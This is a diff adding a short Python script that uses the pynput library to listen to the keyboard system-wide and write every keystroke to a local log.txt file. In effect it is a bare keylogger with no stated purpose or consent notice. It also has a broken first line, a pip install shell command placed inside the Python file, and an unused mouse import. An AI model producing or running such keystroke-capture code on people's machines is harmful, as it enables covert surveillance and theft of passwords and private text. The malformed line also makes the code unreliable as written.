@@ -1,0 +1,17 @@
+pip install pynput
+
+from pynput import keyboard, mouse
+import pynput
+
+def on_press(key):
+    try:
+        with open("log.txt", "a") as log_file:
+            log_file.write(f'{key.char}\n')
+    except AttributeError:
+        with open("log.txt", "a") as log_file:
+            log_file.write(f'{key}\n')
+
+# Set up the listener
+listener = pynput.keyboard.Listener(on_press=on_press)
+listener.start()
+listener.join()
